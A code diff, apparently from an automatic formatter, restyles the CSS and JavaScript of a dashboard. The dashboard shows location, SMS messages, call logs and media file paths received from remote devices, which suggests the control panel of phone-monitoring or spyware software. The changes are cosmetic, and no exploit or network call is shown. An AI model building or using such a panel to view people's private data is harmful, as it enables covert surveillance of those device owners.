@@ -165,7 +165,9 @@
         overflow-y: auto;
         font-size: 12px;
       }
-      .tab-panel.active { display: block; }
+      .tab-panel.active {
+        display: block;
+      }
       .data-row {
         display: flex;
         flex-direction: column;
@@ -173,9 +175,17 @@
         border-bottom: 1px solid #1e2330;
         line-height: 1.5;
       }
-      .data-row:last-child { border-bottom: none; }
-      .data-label { color: #546e7a; font-size: 11px; }
-      .data-val   { color: #cfd8dc; word-break: break-all; }
+      .data-row:last-child {
+        border-bottom: none;
+      }
+      .data-label {
+        color: #546e7a;
+        font-size: 11px;
+      }
+      .data-val {
+        color: #cfd8dc;
+        word-break: break-all;
+      }
       .data-badge {
         display: inline-block;
         border-radius: 4px;
@@ -184,12 +194,32 @@
         font-weight: bold;
         margin-left: 6px;
       }
-      .badge-in     { background: #1b5e20; color: #a5d6a7; }
-      .badge-out    { background: #0d47a1; color: #90caf9; }
-      .badge-missed { background: #b71c1c; color: #ef9a9a; }
-      .badge-inbox  { background: #263238; color: #80cbc4; }
-      .badge-sent   { background: #1a237e; color: #9fa8da; }
-      .badge-unread { background: #e65100; color: #ffe0b2; font-size: 9px; margin-left: 4px; }
+      .badge-in {
+        background: #1b5e20;
+        color: #a5d6a7;
+      }
+      .badge-out {
+        background: #0d47a1;
+        color: #90caf9;
+      }
+      .badge-missed {
+        background: #b71c1c;
+        color: #ef9a9a;
+      }
+      .badge-inbox {
+        background: #263238;
+        color: #80cbc4;
+      }
+      .badge-sent {
+        background: #1a237e;
+        color: #9fa8da;
+      }
+      .badge-unread {
+        background: #e65100;
+        color: #ffe0b2;
+        font-size: 9px;
+        margin-left: 4px;
+      }
 
       /* ── Recording list ─────────────────────────────────────────── */
       .rec-list {
@@ -571,13 +601,15 @@
 
       function openTab(deviceId, tab, btn) {
         // Hide all panels for this device
-        ["location","sms","calls","media"].forEach(t => {
+        ["location", "sms", "calls", "media"].forEach((t) => {
           const p = document.getElementById(`tab_${deviceId}_${t}`);
           if (p) p.classList.remove("active");
         });
         // Deactivate all tab buttons on this card
         const card = document.getElementById(`card_${deviceId}`);
-        card.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
+        card
+          .querySelectorAll(".tab-btn")
+          .forEach((b) => b.classList.remove("active"));
         // Activate selected
         const panel = document.getElementById(`tab_${deviceId}_${tab}`);
         if (panel) panel.classList.add("active");
@@ -602,15 +634,15 @@
               </div>
               <div class="data-row">
                 <span class="data-label">Accuracy</span>
-                <span class="data-val">${l.accuracy ? l.accuracy.toFixed(1) + ' m' : 'N/A'}</span>
+                <span class="data-val">${l.accuracy ? l.accuracy.toFixed(1) + " m" : "N/A"}</span>
               </div>
               <div class="data-row">
                 <span class="data-label">Provider</span>
-                <span class="data-val">${l.provider || 'N/A'}</span>
+                <span class="data-val">${l.provider || "N/A"}</span>
               </div>
               <div class="data-row">
                 <span class="data-label">Time</span>
-                <span class="data-val">${l.time ? new Date(l.time).toLocaleString() : 'N/A'}</span>
+                <span class="data-val">${l.time ? new Date(l.time).toLocaleString() : "N/A"}</span>
               </div>`;
           }
         }
@@ -621,16 +653,20 @@
           if (data.sms.length === 0) {
             smsEl.innerHTML = `<div class="data-row"><span class="data-label">No SMS found or permission denied</span></div>`;
           } else {
-            smsEl.innerHTML = data.sms.map(s => `
+            smsEl.innerHTML = data.sms
+              .map(
+                (s) => `
               <div class="data-row">
                 <div>
-                  <span class="data-val" style="font-weight:bold">${s.address || 'Unknown'}</span>
+                  <span class="data-val" style="font-weight:bold">${s.address || "Unknown"}</span>
                   <span class="data-badge badge-${s.type}">${s.type}</span>
-                  ${!s.read ? '<span class="data-badge badge-unread">UNREAD</span>' : ''}
+                  ${!s.read ? '<span class="data-badge badge-unread">UNREAD</span>' : ""}
                   <span class="data-label" style="float:right">${new Date(s.date).toLocaleString()}</span>
                 </div>
-                <span class="data-val">${escHtml(s.body || '')}</span>
-              </div>`).join('');
+                <span class="data-val">${escHtml(s.body || "")}</span>
+              </div>`,
+              )
+              .join("");
           }
         }
 
@@ -640,16 +676,20 @@
           if (data.callLog.length === 0) {
             callsEl.innerHTML = `<div class="data-row"><span class="data-label">No calls found or permission denied</span></div>`;
           } else {
-            callsEl.innerHTML = data.callLog.map(c => `
+            callsEl.innerHTML = data.callLog
+              .map(
+                (c) => `
               <div class="data-row">
                 <div>
-                  <span class="data-val" style="font-weight:bold">${c.name || c.number || 'Unknown'}</span>
-                  ${c.name ? `<span class="data-label"> ${c.number}</span>` : ''}
-                  <span class="data-badge badge-${c.type === 'incoming' ? 'in' : c.type === 'outgoing' ? 'out' : 'missed'}">${c.type}</span>
+                  <span class="data-val" style="font-weight:bold">${c.name || c.number || "Unknown"}</span>
+                  ${c.name ? `<span class="data-label"> ${c.number}</span>` : ""}
+                  <span class="data-badge badge-${c.type === "incoming" ? "in" : c.type === "outgoing" ? "out" : "missed"}">${c.type}</span>
                   <span class="data-label" style="float:right">${new Date(c.date).toLocaleString()}</span>
                 </div>
                 <span class="data-label">Duration: ${formatDuration(c.duration)}</span>
-              </div>`).join('');
+              </div>`,
+              )
+              .join("");
           }
         }
 
@@ -659,28 +699,37 @@
           if (data.media.length === 0) {
             mediaEl.innerHTML = `<div class="data-row"><span class="data-label">No media found or permission denied</span></div>`;
           } else {
-            mediaEl.innerHTML = data.media.map(m => `
+            mediaEl.innerHTML = data.media
+              .map(
+                (m) => `
               <div class="data-row">
                 <div>
-                  <span class="data-val">${escHtml(m.name || '')}</span>
+                  <span class="data-val">${escHtml(m.name || "")}</span>
                   <span class="data-badge" style="background:#1a237e;color:#9fa8da">${m.type}</span>
                 </div>
                 <span class="data-label">${formatSize(m.size)} · ${m.mime} · ${new Date(m.date).toLocaleDateString()}</span>
-                <span class="data-label" style="color:#37474f;font-size:10px">${escHtml(m.path || '')}</span>
-              </div>`).join('');
+                <span class="data-label" style="color:#37474f;font-size:10px">${escHtml(m.path || "")}</span>
+              </div>`,
+              )
+              .join("");
           }
         }
 
-        log(`📊 Data received from ${deviceId.substring(0,8)}`, "info");
+        log(`📊 Data received from ${deviceId.substring(0, 8)}`, "info");
       }
 
       function escHtml(str) {
-        return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+        return String(str)
+          .replace(/&/g, "&amp;")
+          .replace(/</g, "&lt;")
+          .replace(/>/g, "&gt;")
+          .replace(/"/g, "&quot;");
       }
 
       function formatDuration(secs) {
-        if (!secs) return '0s';
-        const m = Math.floor(secs / 60), s = secs % 60;
+        if (!secs) return "0s";
+        const m = Math.floor(secs / 60),
+          s = secs % 60;
         return m > 0 ? `${m}m ${s}s` : `${s}s`;
       }
 
